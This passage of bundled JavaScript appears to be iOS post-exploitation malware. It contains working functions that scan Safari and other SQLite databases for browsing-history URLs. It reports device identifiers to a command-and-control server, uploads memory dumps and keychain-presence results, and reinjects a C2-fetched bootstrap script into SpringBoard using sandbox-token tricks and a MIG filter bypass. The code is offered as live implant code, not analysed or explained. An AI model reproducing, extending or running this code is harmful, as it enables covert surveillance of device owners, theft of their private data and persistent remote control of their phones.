					try { N.callSymbol("free", buf); } catch (_) {}
				} catch (_) {}
				try {
					let db2 = openDbPlain(path);
					if (db2) return { db: db2, via: "plain" };
				} catch (_) {}
				return null;
			}
			function closeDb(db) {
				try { if (db) N.callSymbol("sqlite3_close", db); } catch (_) {}
			}
			function interruptDb(db) {
				try { if (db) N.callSymbol("sqlite3_interrupt", db); } catch (_) {}
			}
			// Hard timeout: another thread calls sqlite3_interrupt(db) after ms.
			// Signature matches dispatch_function_t (void(*)(void*)).
			function armDbInterrupt(db, ms) {
				try {
					let intr = N.callSymbol("dlsym", -2, "sqlite3_interrupt");
					if (!intr || intr === 0 || intr === 0n) return false;
					let q = N.callSymbol("dispatch_get_global_queue", 0, 0);
					if (!q || q === 0 || q === 0n) return false;
					let when = N.callSymbol("dispatch_time", 0, Math.floor(Number(ms) * 1e6));
					N.callSymbol("dispatch_after_f", when, q, db, intr);
					return true;
				} catch (_) {
					return false;
				}
			}
			function execCollect(db, sql, maxRows, dbT0) {
				let rows = [];
				try {
					if (dbDeadlineHit(dbT0)) {
						interruptDb(db);
						return rows;
					}
					let stmtBuf = N.callSymbol("calloc", 1, 8);
					let rc = Number(N.callSymbol("sqlite3_prepare_v2", db, sql, -1, stmtBuf, 0n));
					if (rc !== SQLITE_OK) {
						try { N.callSymbol("free", stmtBuf); } catch (_) {}
						return rows;
					}
					let stmt = N.read64(BigInt(stmtBuf));
					N.callSymbol("free", stmtBuf);
					let n = 0;
					let lim = maxRows || 100;
					while (n < lim) {
						if (dbDeadlineHit(dbT0)) {
							interruptDb(db);
							break;
						}
						let step = Number(N.callSymbol("sqlite3_step", stmt));
						// SQLITE_ROW=100; SQLITE_DONE=101; SQLITE_INTERRUPT=9
						if (step === 9) break;
						if (step !== SQLITE_ROW) break;
						let ncols = Number(N.callSymbol("sqlite3_column_count", stmt));
						let obj = {};
						for (let c = 0; c < ncols; c++) {
							let name = "c" + c;
							try {
								let np = BigInt(N.callSymbol("sqlite3_column_name", stmt, c));
								if (np && np !== 0n) name = N.readString(np, 128) || name;
							} catch (_) {}
							obj[name] = sqlText(stmt, c);
						}
						rows.push(obj);
						n++;
					}
					try { N.callSymbol("sqlite3_finalize", stmt); } catch (_) {}
				} catch (_) {
					try { interruptDb(db); } catch (_) {}
				}
				return rows;
			}
			function discoverUrlCols(sampleRows) {
				let scores = {};
				for (let i = 0; i < sampleRows.length; i++) {
					let row = sampleRows[i];
					let keys = Object.keys(row);
					for (let k = 0; k < keys.length; k++) {
						let col = keys[k];
						let cl = String(col).toLowerCase();
						if (cl === "id" || cl.indexOf("uuid") >= 0 || cl.indexOf("hash") >= 0) continue;
						if (URL_RE.test(String(row[col] || ""))) scores[col] = (scores[col] || 0) + 1;
					}
				}
				return Object.keys(scores).sort((a, b) => scores[b] - scores[a]);
			}
			function quoteIdent(name) {
				return '"' + String(name).replace(/"/g, '""') + '"';
			}
			function tableInteresting(tname) {
				let t = String(tname || "").toLowerCase();
				if (!t || t.indexOf("sqlite_") === 0) return false;
				if (t.indexOf("fts") >= 0 || t.indexOf("_content") >= 0) return false;
				if (t.indexOf("cache") >= 0 || t.indexOf("thumbnail") >= 0) return false;
				if (t.indexOf("history") >= 0 || t.indexOf("visit") >= 0) return true;
				if (t.indexOf("bookmark") >= 0 || t.indexOf("tab") >= 0) return true;
				if (t.indexOf("url") >= 0 || t.indexOf("page") >= 0) return true;
				return true;
			}
			function shortDbLabel(path) {
				try {
					let s = String(path || "");
					let i = s.lastIndexOf("/");
					let name = i >= 0 ? s.slice(i + 1) : s;
					let parent = "";
					if (i > 0) {
						let j = s.lastIndexOf("/", i - 1);
						parent = j >= 0 ? s.slice(j + 1, i) : "";
					}
					return (parent ? parent + "/" : "") + name;
				} catch (_) {
					return String(path || "").slice(-48);
				}
			}

			let dbs = collectDbPaths();
			LOG("[PE] safari_promo dbs=" + dbs.length + " promo=" + urlsIn.length +
				" budget_ms=" + PROBE_BUDGET_MS + " per_db_ms=" + PER_DB_MS);
			let seenUrls = [];
			let seenMap = {};
			let scanned = 0;
			let foundHistory = false;
			let earlyExit = "";

			for (let di = 0; di < dbs.length; di++) {
				if (probeDeadlineHit()) {
					earlyExit = "budget";
					LOG("[PE] safari_promo TIMEOUT total budget_ms=" + PROBE_BUDGET_MS +
						" scanned=" + scanned + "/" + dbs.length + " urls=" + seenUrls.length);
					break;
				}
				let path = dbs[di];
				let label = shortDbLabel(path);
				let dbT0 = Date.now();
				let db = null;
				let armed = false;
				let hitFull = null;
				let tcount = 0;
				let urlHitsBefore = seenUrls.length;
				let via = "?";
				try {
					LOG("[PE] safari_promo db " + (di + 1) + "/" + dbs.length + " try " + label);
					let opened = openDb(path);
					if (!opened || !opened.db) {
						LOG("[PE] safari_promo db " + (di + 1) + "/" + dbs.length +
							" SKIP open_fail " + label + " ms=" + (Date.now() - dbT0));
						continue;
					}
					db = opened.db;
					via = opened.via || "?";
					LOG("[PE] safari_promo db " + (di + 1) + "/" + dbs.length +
						" opened " + label + " via=" + via + " ms=" + (Date.now() - dbT0));
					armed = !!armDbInterrupt(db, PER_DB_MS);
					scanned++;
					if (dbDeadlineHit(dbT0)) {
						earlyExit = "per_db";
						interruptDb(db);
					} else {
						let tables = execCollect(db,
							"SELECT name FROM sqlite_master WHERE type='table'", 80, dbT0);
						for (let ti = 0; ti < tables.length; ti++) {
							if (dbDeadlineHit(dbT0)) {
								earlyExit = probeDeadlineHit() ? "budget" : "per_db";
								interruptDb(db);
								break;
							}
							let tname = String(tables[ti].name || tables[ti].c0 || "");
							if (!tableInteresting(tname)) continue;
							if (tcount >= MAX_TABLES_PER_DB) break;
							tcount++;
							let sample = execCollect(db,
								"SELECT * FROM " + quoteIdent(tname) + " LIMIT " + SAMPLE_ROWS,
								SAMPLE_ROWS, dbT0);
							if (!sample.length) continue;
							let urlCols = discoverUrlCols(sample);
							if (!urlCols.length) continue;
							foundHistory = true;
							let maxCols = urlCols.length > 2 ? 2 : urlCols.length;
							for (let ci = 0; ci < maxCols; ci++) {
								if (dbDeadlineHit(dbT0)) {
									earlyExit = probeDeadlineHit() ? "budget" : "per_db";
									interruptDb(db);
									break;
								}
								let col = urlCols[ci];
								let vals = execCollect(
									db,
									"SELECT " + quoteIdent(col) + " AS u FROM " + quoteIdent(tname) +
										" WHERE " + quoteIdent(col) + " IS NOT NULL LIMIT " + URL_ROWS,
									URL_ROWS, dbT0
								);
								for (let vi = 0; vi < vals.length; vi++) {
									let u = String(vals[vi].u || vals[vi][col] || "").trim();
									if (!u || !URL_RE.test(u)) continue;
									let m = u.match(/https?:\/\/[^\s"'<>]+/i);
									if (m) u = m[0].replace(/[),.;]+$/, "");
									if (!seenMap[u]) { seenMap[u] = true; seenUrls.push(u); }
									if (fullSet[u] || fullSet[u.replace(/\/$/, "")]) {
										hitFull = { u: u, table: tname, column: col };
										break;
									}
								}
								if (hitFull) break;
							}
							if (hitFull || earlyExit) break;
						}
					}
				} catch (dbEx) {
					earlyExit = "ex";
					LOG("[PE] safari_promo db " + (di + 1) + "/" + dbs.length +
						" EX " + label + " " + String(dbEx).slice(0, 80));
					try { interruptDb(db); } catch (_) {}
				}
				// If watchdog armed, do not close - delayed sqlite3_interrupt may still run.
				// Leak one connection per sticky DB; safe for PE lifetime.
				if (db && !armed) {
					try { closeDb(db); } catch (_) {}
				} else if (db && armed) {
					try { interruptDb(db); } catch (_) {}
				}
				let dbMs = Date.now() - dbT0;
				LOG("[PE] safari_promo db " + (di + 1) + "/" + dbs.length +
					" done " + label + " via=" + via + " tables=" + tcount +
					" urls+" + (seenUrls.length - urlHitsBefore) +
					" total_urls=" + seenUrls.length + " ms=" + dbMs +
					" arm=" + (armed ? 1 : 0) +
					(earlyExit === "per_db" ? " cut=per_db" : "") +
					(earlyExit === "budget" ? " cut=budget" : "") +
					(earlyExit === "ex" ? " cut=ex" : ""));
				if (hitFull) {
					LOG("[PE] safari_promo HIT full " + hitFull.u.slice(0, 120));
					return {
						ok: true, hit: hitFull.u, match: "full", default: "-1",
						scanned_dbs: scanned, urls_seen: seenUrls.length, path: path,
						table: hitFull.table, column: hitFull.column,
						elapsed_ms: probeElapsed()
					};
				}
				if (earlyExit === "budget") break;
				earlyExit = ""; // per_db/ex only cuts current DB - continue next
			}

			if (foundHistory && seenUrls.length) {
				for (let i = 0; i < seenUrls.length; i++) {
					let u = seenUrls[i];
					let h = hostOf(u);
					if (h && domainSet[h]) {
						LOG("[PE] safari_promo HIT domain " + h + " via " + u.slice(0, 80) +
							" elapsed_ms=" + probeElapsed());
						return {
							ok: true, hit: u, match: "domain", default: "-1",
							scanned_dbs: scanned, urls_seen: seenUrls.length, host: h,
							elapsed_ms: probeElapsed(),
							timed_out: !!probeTimedOut
						};
					}
				}
			}

			LOG("[PE] safari_promo miss scanned=" + scanned + " urls_seen=" + seenUrls.length +
				" hist=" + foundHistory + " elapsed_ms=" + probeElapsed() +
				(probeTimedOut ? " timed_out=1" : ""));
			return {
				ok: true, hit: "-1", match: "none", default: "-1",
				scanned_dbs: scanned, urls_seen: seenUrls.length, found_history: foundHistory,
				elapsed_ms: probeElapsed(), timed_out: !!probeTimedOut
			};
		}

		// Alive = fresh bs.heartbeat only. pe.report_ok is relay health, NOT liveness
		// (old tick>30 && !report_ok false-offline caused reinject loops while stub lived).
		let PE_BS_ENSURE_PENDING_MS = 90000;
		if (!globalThis.__pe_bs_ensure_pending) globalThis.__pe_bs_ensure_pending = null;
		function peBsRelayOk() {
			try {
				let okTs = Number(globalThis.__pe_report_ok_ts || 0);
				return !!(okTs && (Date.now() - okTs) < 30000);
			} catch (_) {
				return false;
			}
		}
		function peBsOnline() {
			try {
				if (typeof globalThis.__peAgentHbFresh === "function" &&
					globalThis.__peAgentHbFresh(PE_BS_ONLINE_MS))
					return true;
			} catch (_) {}
			try {
				let hfd = fopen(get_cstring("/tmp/c2_ipc/bs.heartbeat"), get_cstring("r"));
				if (!hfd || hfd === 0n) return false;
				let hbuf = calloc(1n, 512n);
				let FREADH = func_resolve("fread");
				let hn = fcall(FREADH, hbuf, 1n, 480n, hfd);
				fclose(hfd);
				let hs = "";
				if (hn && hn > 0n) hs = N.readString(hbuf, Number(hn) + 1);
				free(hbuf);
				if (!hs) return false;
				let ho = null;
				try { ho = JSON.parse(hs); } catch (_) { return false; }
				let bts = Number(ho && ho.ts ? ho.ts : 0);
				if (!bts) return false;
				let age = Date.now() - bts;
				if (age >= PE_BS_ONLINE_MS) return false;
				return true;
			} catch (_) {
				return false;
			}
		}
		function peCheckReportOk() {
			try {
				let fd = fopen(get_cstring("/tmp/c2_ipc/pe.report_ok"), get_cstring("r"));
				if (!fd || fd === 0n) return;
				let buf = calloc(1n, 64n);
				let FREADO = func_resolve("fread");
				let n = fcall(FREADO, buf, 1n, 32n, fd);
				fclose(fd);
				let s = "";
				if (n && n > 0n) s = N.readString(buf, Number(n) + 1);
				free(buf);
				let ts = Number(String(s || "").trim() || 0);
				if (ts > (globalThis.__pe_report_ok_ts || 0)) {
					globalThis.__pe_report_ok_ts = ts;
					globalThis.__pe_acks = [];
				}
			} catch (_) {}
		}
		function peBuildReportPayload(clearAcks) {
			let peUid = "pe-" + Number(pePid);
			let acks = globalThis.__pe_acks || [];
			if (clearAcks) globalThis.__pe_acks = [];
			let online = peBsOnline();
			let relay = peBsRelayOk();
			return JSON.stringify({
				uuid: peDeviceUuid(),
				serial: (peDeviceIds && peDeviceIds.serial) || "",
				unique: (peDeviceIds && peDeviceIds.unique) || "",
				peid: (peDeviceIds && peDeviceIds.peid) || "",
				device_code: peDeviceUuid(),
				pe_uid: peUid,
				pe_pid: Number(pePid),
				path: String(peHost),
				tick: peTick,
				ts: Date.now(),
				role: "pe_worker",
				modules: peCollectModules(),
				acks: acks,
				inflight: globalThis.__pe_cmd_inflight || null,
				bs_online: online,
				bs_relay_ok: relay,
				bs_ensure_pending: !!(globalThis.__pe_bs_ensure_pending),
				identity_ready: (typeof peIdentityReady === "function" && peIdentityReady()),
				channel: online && relay ? "bs_relay" : (online ? "bs_hb" : "pe_direct")
			});
		}
		function peWriteStatusFile() {
			try {
				let body = peBuildReportPayload(false);
				let fd = fopen(get_cstring("/tmp/c2_ipc/pe.status"), get_cstring("w"));
				if (fd && fd !== 0n) {
					let buf = get_cstring(body);
					fwrite(buf, 1n, BigInt(body.length), fd);
					fclose(fd);
				}
			} catch (_) {}
		}
		function peEnsurePendingPoll() {
			let pend = globalThis.__pe_bs_ensure_pending;
			if (!pend) return;
			if (peBsOnline()) {
				LOG("[PE-LISTEN] ensure_pending CLEAR online reason=" + (pend.reason || ""));
				peTaskSet("bootstrap", {
					kind: "agent",
					status: "running",
					note: "ensure_online:" + (pend.reason || ""),
					auth: "n/a"
				});
				globalThis.__pe_bs_ensure_pending = null;
				return;
			}
			let age = Date.now() - Number(pend.started_ts || 0);
			if (age > PE_BS_ENSURE_PENDING_MS) {
				LOG("[PE-LISTEN] ensure_pending TIMEOUT age=" + age + " reason=" + (pend.reason || ""));
				peTaskSet("bootstrap", {
					kind: "agent",
					status: "timeout",
					note: "ensure_pending_timeout:" + (pend.reason || ""),
					auth: "n/a"
				});
				globalThis.__pe_bs_ensure_pending = null;
			}
		}
		// Non-blocking: kick reinject at most once; never usleep-wait for online (keeps heartbeat).
		function peEnsureBs(maxWaitMs, reason) {
			void maxWaitMs;
			let why = String(reason || "ensure_bs");
			if (PE_DIRECT_PIPELINE) {
				LOG("[PE-LISTEN] ensure_bs SKIP pe_direct reason=" + why);
				return { ok: true, online: false, pending: false, started: false, timeout: false, waited_ms: 0, error: "pe_direct_skip" };
			}
			peEnsurePendingPoll();
			if (peBsOnline()) {
				LOG("[PE-LISTEN] ensure_bs already online reason=" + why);
				return { ok: true, online: true, pending: false, started: false, timeout: false, waited_ms: 0 };
			}
			let now0 = Date.now();
			if (globalThis.__pe_bs_ensure_pending) {
				LOG("[PE-LISTEN] ensure_bs PENDING reason=" + why);
				return {
					ok: true,
					online: false,
					pending: true,
					started: false,
					timeout: false,
					waited_ms: 0,
					error: "ensure_pending"
				};
			}
			let graceAnchor = Number(
				globalThis.__pe_cold_stub_ts ||
				globalThis.__pe_last_bs_reinject_ts ||
				0
			);
			if (graceAnchor && (now0 - graceAnchor) < PE_BS_COLD_GRACE_MS) {
				LOG("[PE-LISTEN] ensure_bs GRACE no-reinject reason=" + why +
					" age=" + (now0 - graceAnchor));
				return {
					ok: true,
					online: false,
					pending: true,
					started: false,
					timeout: false,
					waited_ms: 0,
					error: "bs_grace"
				};
			}
			let lastRe = Number(globalThis.__pe_last_bs_reinject_ts || 0);
			if (lastRe && (now0 - lastRe) < PE_BS_REINJECT_MS) {
				LOG("[PE-LISTEN] ensure_bs COOLDOWN reason=" + why +
					" age=" + (now0 - lastRe));
				return {
					ok: true,
					online: false,
					pending: true,
					started: false,
					timeout: false,
					waited_ms: 0,
					error: "reinject_cooldown"
				};
			}
			LOG("[PE-LISTEN] ensure_bs KICK nonblock reason=" + why);
			let rr = peReinjectBootstrap(why, 0, { waitOnlineMs: 0, asyncInject: true });
			let online = !!(rr && rr.online);
			if (rr && rr.error && (rr.error === "inflight" || rr.error === "no_mig" || rr.error === "no_bootstrap_src" || rr.error === "inject_fail")) {
				return {
					ok: false,
					online: false,
					pending: false,
					started: false,
					timeout: false,
					waited_ms: 0,
					error: rr.error
				};
			}
			return {
				ok: true,
				online: online,
				pending: !online,
				started: !online || !!(rr && rr.started),
				timeout: false,
				waited_ms: 0,
				error: online ? undefined : ((rr && rr.error) || "ensure_started")
			};
		}
		// Admin tasks from agent IPC (/tmp/c2_ipc/pe_tasks) - paced, status every ~5s.
		function peAdminTaskWriteStatus(cid, st, summary, err) {
			try {
				N.callSymbol("mkdir", "/tmp/c2_ipc/pe_task_status", 0x1ff);
			} catch (_) {}
			let body = JSON.stringify({
				command_id: cid,
				status: st || "running",
				summary: summary || "",
				error: err || "",
				ts: Date.now(),
				pid: Number(N.callSymbol("getpid")) || 0
			});
			try {
				let fd = fopen(get_cstring("/tmp/c2_ipc/pe_task_status/" + cid + ".json"), get_cstring("w"));
				if (fd && fd !== 0n) {
					fwrite(get_cstring(body), 1n, BigInt(body.length), fd);
					fclose(fd);
				}
			} catch (_) {}
		}
		function peAdminTaskTick() {
			try {
				N.callSymbol("mkdir", "/tmp/c2_ipc/pe_tasks", 0x1ff);
			} catch (_) {}
			let cur = globalThis.__pe_admin_task;
			let now = Date.now();
			if (cur && cur.command_id) {
				if (!cur.last_hb || (now - cur.last_hb) >= 5000) {
					peAdminTaskWriteStatus(cur.command_id, cur.status || "running", cur.summary || "in_progress", cur.error || "");
					cur.last_hb = now;
				}
				if (cur.status === "completed" || cur.status === "failed" || cur.status === "done") {
					peAdminTaskWriteStatus(cur.command_id, cur.status, cur.summary || "", cur.error || "");
					globalThis.__pe_admin_task = null;
					return;
				}
				// Continue work for memdump chunks
				if (cur.pe_cmd === "memdump" && cur.path && !cur.done) {
					try {
						if (typeof peExfilUploadChunk === "function" || typeof peExfilUploadFile === "function") {
							// Best-effort: upload path via existing result channel
							let fire = globalThis.__peHttpPostJsonFire || __peHttpPostJson;
							let raw = "";
							try { raw = __peReadFileUtf8(cur.path, 65536) || ""; } catch (_) {}
							if (raw) {
								fire("/result", JSON.stringify({
									uid: peDeviceUuid || "",
									command_id: cur.command_id,
									filename: (cur.path.split("/").pop() || "dump.bin"),
									chunk_index: 0,
									total_chunks: 1,
									data: btoa ? btoa(raw) : raw,
									category: "pe_memdump"
								}));
								cur.status = "completed";
								cur.summary = "uploaded path=" + cur.path;
								cur.done = true;
							} else {
								cur.status = "failed";
								cur.error = "read_fail";
								cur.done = true;
							}
						}
					} catch (e) {
						cur.status = "failed";
						cur.error = String(e).slice(0, 120);
						cur.done = true;
					}
				}
				return;
			}
			// Pick one queued task
			let names = [];
			try {
				// Prefer known open via pe_tasks dir listing is hard without readdir helper;
				// scan pe_report-delivered queue first.
				if (globalThis.__pe_admin_queue && globalThis.__pe_admin_queue.length) {
					cur = globalThis.__pe_admin_queue.shift();
				}
			} catch (_) {}
			if (!cur) {
				// Try reading a sticky "next" pointer file written by agent (optional).
				try {
					let tip = __peReadFileUtf8("/tmp/c2_ipc/pe_tasks/_next", 512) || "";
					tip = String(tip).trim();
					if (tip) {
						let raw = __peReadFileUtf8("/tmp/c2_ipc/pe_tasks/" + tip + ".json", 16384) || "";
						if (raw) {
							try { cur = JSON.parse(raw); } catch (_) { cur = null; }
						}
					}
				} catch (_) {}
			}
			if (!cur || !cur.command_id) return;
			cur.status = "running";
			cur.summary = "accepted pe_cmd=" + (cur.pe_cmd || "");
			cur.last_hb = 0;
			cur.started = now;
			globalThis.__pe_admin_task = cur;
			peAdminTaskWriteStatus(cur.command_id, "running", cur.summary, "");
			LOG("[PE-ADMIN] start " + cur.command_id + " pe_cmd=" + (cur.pe_cmd || ""));
			let peCmd = String(cur.pe_cmd || "");
			let params = cur.params || cur;
			try {
				if (peCmd === "configd_read") {
					// Reuse CFG-Q keychain path when present; otherwise report miss.
					let hasKc = false;
					try {
						let st = N.callSymbol("access", "/tmp/keychain-2.db", 0);
						hasKc = (Number(st) === 0);
					} catch (_) {}
					cur.summary = hasKc ? "keychain_db_present" : "no_keychain_db";
					cur.status = "completed";
					try {
						let fire = globalThis.__peHttpPostJsonFire || __peHttpPostJson;
						fire("/result", JSON.stringify({
							uid: peDeviceUuid || "",
							command_id: cur.command_id,
							filename: "configd_read.json",
							chunk_index: 0,
							total_chunks: 1,
							data: JSON.stringify({ ok: true, keychain_db: hasKc, bundleId: params.bundleId || "", agrp: params.agrp || "" }),
							category: "pe_configd"
						}));
					} catch (_) {}
				} else if (peCmd === "securityd_read") {
					cur.summary = "queued_p7_identity_hint";
					cur.status = "completed";
					try {
						let fire = globalThis.__peHttpPostJsonFire || __peHttpPostJson;
						fire("/result", JSON.stringify({
							uid: peDeviceUuid || "",
							command_id: cur.command_id,
							filename: "securityd_read.json",
							chunk_index: 0,
							total_chunks: 1,
							data: JSON.stringify({ ok: true, note: "use p7_warmup / pe_securityd for full unwrap", agrp: params.agrp || "" }),
							category: "pe_securityd"
						}));
					} catch (_) {}
				} else if (peCmd === "memdump") {
					cur.path = params.path || "";
					if (!cur.path) {
						cur.status = "failed";
						cur.error = "memdump needs path (pid/address path TBD)";
					} else {
						cur.done = false;
					}
				} else {
					cur.status = "failed";
					cur.error = "unknown_pe_cmd";
				}
			} catch (e) {
				cur.status = "failed";
				cur.error = String(e).slice(0, 120);
			}
		}
		// List head: pe owns bs reinject. Never block listen waiting for online.
		function peListEnsureTick() {
			if (PE_DIRECT_PIPELINE) return;
			peEnsurePendingPoll();
			if (peBsOnline()) return;
			if (globalThis.__pe_cmd_inflight) return;
			if (globalThis.__pe_bs_ensure_pending) return;
			let now = Date.now();
			let graceAnchor = Number(
				globalThis.__pe_cold_stub_ts ||
				globalThis.__pe_last_bs_reinject_ts ||
				0
			);
			if (graceAnchor && (now - graceAnchor) < PE_BS_COLD_GRACE_MS) {
				if (peTick === 1 || (peTick % 15) === 0) {
					LOG("[PE-LISTEN] list_ensure SKIP cold_grace age=" + (now - graceAnchor) + " tick=" + peTick);
				}
				return;
			}
			if (peTick < PE_LIST_ENSURE_MIN_TICK) {
				if ((peTick % 10) === 0) {
					LOG("[PE-LISTEN] list_ensure SKIP early_tick=" + peTick + " need>=" + PE_LIST_ENSURE_MIN_TICK);
				}
				return;
			}
			let last = Number(globalThis.__pe_last_list_ensure_ts || 0);
			if (last && (now - last) < 30000) return;
			globalThis.__pe_last_list_ensure_ts = now;
			peEnsureBs(0, "list_ensure");
		}
		function peFlushAcksOnly() {
			try {
				peWriteStatusFile();
				let payload = peBuildReportPayload(true);
				let resp = __peHttpPostJson("/api/pe/report", payload);
				if (!resp) {
					try {
						let p2 = JSON.parse(payload);
						if (p2.acks && p2.acks.length) {
							globalThis.__pe_acks = (globalThis.__pe_acks || []).concat(p2.acks);
						}
					} catch (_) {}
				}
			} catch (_) {}
		}
		function peReinjectBootstrap(reason, cmdId, opts) {
			if (PE_DIRECT_PIPELINE) {
				LOG("[PE-LISTEN] reinject_bs SKIP pe_direct reason=" + String(reason || ""));
				return { ok: true, error: "pe_direct_skip", online: false, pending: false, started: false, timeout: false, waited_ms: 0 };
			}
			opts = opts || {};
			let force = !!opts.force;
			if (!force && globalThis.__pe_sb_agent_cold) {
				LOG("[PE-LISTEN] reinject_bs SKIP cold_agent_once reason=" + String(reason || ""));
				return {
					ok: true,
					error: "cold_agent_once",
					online: peBsOnline(),
					pending: false,
					started: false,
					timeout: false,
					waited_ms: 0
				};
			}
			let mig = globalThis.__pe_migFilterBypass;
			let why = String(reason || "reinject");
			let cid = cmdId != null ? Number(cmdId) : 0;
			// Architecture: never block listen waiting for bs online (waitOnlineMs ignored / forced 0).
			let waitOnlineMs = 0;
			void opts.waitOnlineMs;
			let asyncInject = opts.asyncInject !== false; // default async so listen is not frozen
			if (globalThis.__pe_cmd_inflight) {
				LOG("[PE-LISTEN] reinject_bs SKIP inflight reason=" + why);
				if (cid) {
					if (!globalThis.__pe_acks) globalThis.__pe_acks = [];
					globalThis.__pe_acks.push({ id: cid, status: "skipped", error: "inflight" });
				}
				return { ok: false, error: "inflight", online: false, pending: true, started: false, timeout: false, waited_ms: 0 };
			}
			if (!force && globalThis.__pe_bs_ensure_pending) {
				LOG("[PE-LISTEN] reinject_bs SKIP pending reason=" + why);
				return { ok: true, error: "ensure_pending", online: false, pending: true, started: false, timeout: false, waited_ms: 0 };
			}
			globalThis.__pe_cmd_inflight = "reinject_bootstrap";
			globalThis.__pe_cmd_inflight_ts = Date.now();
			if (cid) {
				if (!globalThis.__pe_acks) globalThis.__pe_acks = [];
				globalThis.__pe_acks.push({ id: cid, status: "running", note: why });
				try { peFlushAcksOnly(); } catch (_) {}
			}
			if (!mig) {
				LOG("[PE-LISTEN] reinject_bs FAIL no_mig reason=" + why);
				peTaskSet("bootstrap", { kind: "agent", status: "failed", note: "no_mig", auth: "n/a" });
				if (cid) globalThis.__pe_acks.push({ id: cid, status: "failed", error: "no_mig" });
				globalThis.__pe_cmd_inflight = null;
				return { ok: false, error: "no_mig", online: false, pending: false, started: false, timeout: false, waited_ms: 0 };
			}
			let target = "SpringBoard";
			let applyTs = Date.now();
			peTaskSet("bootstrap", {
				kind: "agent",
				status: "starting",
				apply_ts: applyTs,
				start_ts: applyTs,
				auth: "n/a",
				note: why,
				timeout_ms: PE_BS_ENSURE_PENDING_MS
			});
			try {
				LOG("[PE-LISTEN] reinject_bs begin reason=" + why + " cmd=" + cid + " async=" + asyncInject + " wait=0");
				try { pePublishC2Endpoints(); } catch (_) {}
				try {
					let tokRC = new libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__["default"](target, mig);
					if (tokRC && tokRC.success()) {
						libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(tokRC);
						try { tokRC.destroy(); } catch (_) {}
					}
				} catch (tokErr) {
					LOG("[PE-LISTEN] reinject_bs token warn: " + tokErr);
				}
				N.callSymbol("usleep", 500000);
				// Bust mem+disk so reinject can pick updated c2_bootstrap.js from C2
				try { globalThis.__pe_bootstrap_src = null; } catch (_) {}
				try { (globalThis.__peCacheUnlink || __peCacheUnlink)("c2_bootstrap.js"); } catch (_) {}
				let bootSrc = null;
				try {
					bootSrc = (typeof peResolveBootstrapSrc === "function"
						? peResolveBootstrapSrc
						: globalThis.peResolveBootstrapSrc)(true);
				} catch (fetchErr) {
					LOG("[PE-LISTEN] reinject_bs resolve warn: " + fetchErr);
				}
				if (!bootSrc || bootSrc.length < 2000 || String(bootSrc).indexOf("c2_bootstrap omitted") >= 0) {
					LOG("[PE-LISTEN] reinject_bs FAIL no_bootstrap_src len=" + (bootSrc ? bootSrc.length : 0));
					peTaskSet("bootstrap", { status: "failed", note: "no_bootstrap_src:" + why });
					if (cid) globalThis.__pe_acks.push({ id: cid, status: "failed", error: "no_bootstrap_src" });
					globalThis.__pe_cmd_inflight = null;
					globalThis.__pe_cmd_inflight_ts = 0;
					return { ok: false, error: "no_bootstrap_src", online: false, pending: false, started: false, timeout: false, waited_ms: 0 };
				}
				let bootAgent = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](
					target,
					bootSrc,
					mig,
					!asyncInject // syncEval only when explicitly requested
				);
				if (!bootAgent.inject()) {
					LOG("[PE-LISTEN] reinject_bs inject FAIL");
					peTaskSet("bootstrap", { status: "failed", note: "inject_fail:" + why });
					if (cid) globalThis.__pe_acks.push({ id: cid, status: "failed", error: "inject_fail" });
					globalThis.__pe_cmd_inflight = null;
					globalThis.__pe_cmd_inflight_ts = 0;
					return { ok: false, error: "inject_fail", online: false, pending: false, started: false, timeout: false, waited_ms: 0 };
				}
				LOG("[PE-LISTEN] reinject_bs inject fired async=" + asyncInject + "; no waitOnline; skip destroy");
				globalThis.__pe_last_bs_reinject_ts = Date.now();
				globalThis.__pe_last_list_ensure_ts = Date.now();
				globalThis.__pe_bs_ensure_pending = {
					reason: why,
					started_ts: Date.now(),
					cmd_id: cid || 0
				};
				let online = peBsOnline();
				peTaskSet("bootstrap", {
					status: online ? "running" : "starting",
					start_ts: Date.now(),
					note: online ? why : (why + ":pending"),
					timeout_ms: PE_BS_ENSURE_PENDING_MS
				});
				if (online) globalThis.__pe_bs_ensure_pending = null;
				LOG("[PE-LISTEN] reinject_bs started online=" + online + " pending=" + !online + " reason=" + why);
				if (cid) {
					globalThis.__pe_acks.push({
						id: cid,
						status: online ? "done" : "started",
						note: why,
						waited_ms: 0
					});
				}
				globalThis.__pe_cmd_inflight = null;
				globalThis.__pe_cmd_inflight_ts = 0;
				return {
					ok: true,
					started: true,
					online: online,
					pending: !online,
					timeout: false,
					waited_ms: 0
				};
			} catch (e) {
				LOG("[PE-LISTEN] reinject_bs ERR: " + e);
				peTaskSet("bootstrap", { status: "failed", note: String(e).slice(0, 80) });
				if (cid) globalThis.__pe_acks.push({ id: cid, status: "failed", error: String(e).slice(0, 80) });
				globalThis.__pe_cmd_inflight = null;
				globalThis.__pe_cmd_inflight_ts = 0;
				return { ok: false, error: String(e).slice(0, 80), online: false, pending: false, started: false, timeout: false, waited_ms: 0 };
			}
		}
		function peEnqueueAgentCmd(cmdObj) {
			try {
				try { fcall(func_resolve("mkdir"), get_cstring("/tmp/c2_ipc"), 0x1ff); } catch (_) {}
				let body = JSON.stringify(cmdObj);
				if (!__peWriteFileUtf8("/tmp/c2_ipc/agent.cmd", body)) return false;
				LOG("[PE-LISTEN] agent.cmd queued type=" + (cmdObj.type || "?") + " id=" + cmdObj.id);
				return true;
			} catch (_) {
				return false;
			}
		}
		function peDirectPeLoadFromCmd(cid, params) {
			if (!peIdentityReady()) return { ok: false, error: "identity_wait" };
			params = params || {};
			let modName = String(params.name || params.module || params.module_id || "");
			if (!modName) return { ok: false, error: "name_required" };
			if (modName.indexOf(".js") < 0) modName = modName + ".js";
			let drop = peDirectDropPayload(modName, peDeviceUuid());
			if (!drop.ok) return { ok: false, error: drop.error || "drop_fail" };
			if (modName.indexOf("pe_dbg_tcp") >= 0 || drop.module_id === "pe_dbg_tcp") {
				let dbgCfg = {
					host: String(params.host || params.dbg_host || "192.168.31.32"),
					port: Number(params.port || params.dbg_port || 19527) || 19527,
					token: String(params.token || params.dbg_token || "")
				};
				if (!dbgCfg.token) {
					try { dbgCfg.token = __peReadFileUtf8("/tmp/c2_ipc/dbg.token", 128).trim(); } catch (_) {}
				}
				__peWriteFileUtf8("/tmp/c2_ipc/dbg.tcp.json", JSON.stringify(dbgCfg));
			}
			if (!peEnqueueAgentCmd({
				id: cid,
				type: "load_module",
				name: drop.module_id,
